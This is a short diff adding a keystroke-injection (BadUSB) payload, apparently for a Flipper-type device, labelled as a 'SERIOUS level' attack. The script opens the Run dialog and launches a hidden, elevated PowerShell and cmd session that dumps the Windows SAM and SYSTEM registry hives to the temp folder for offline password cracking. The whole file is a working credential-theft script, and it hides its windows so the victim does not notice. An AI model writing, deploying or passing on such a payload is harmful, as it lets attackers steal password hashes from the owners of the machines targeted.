@@ -1,0 +1,7 @@
+REM CYBERFLIPPER - SERIOUS Level
+REM SAM Database Extraction - Copies registry hives for offline cracking
+DELAY 500
+GUI r
+DELAY 300
+STRING powershell -W Hidden -C "Start-Process cmd -ArgumentList '/c','reg save HKLM\SAM %TEMP%\sam.hiv /y & reg save HKLM\SYSTEM %TEMP%\system.hiv /y & echo SAVED' -Verb RunAs -WindowStyle Hidden"
+ENTER
